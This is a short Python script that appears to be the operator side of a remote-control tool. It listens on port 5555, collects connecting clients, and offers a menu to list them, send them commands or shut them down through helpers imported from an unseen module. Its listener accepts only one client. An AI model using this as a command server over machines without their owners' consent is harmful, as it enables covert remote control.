from socket import *
from Functions import *
import threading


def manager(server):
    client, addr = server.accept()
    clients.append([client, addr])


server = socket(AF_INET, SOCK_STREAM)
server.bind(("", 5555))
server.listen(100)

clients = []

t = threading.Thread(target=manager, args=(server,))
t.start()

while True:
    menu()
    try:
        option = input("Your option > ")
    except:
        print("Numbers only")
        continue
    if option == "1":
        get_all_clients(clients)
    elif option == "2":
        command(clients)
    elif option == "3":
        shutdown(clients)
    elif option == "exit":
        server.close()
        break
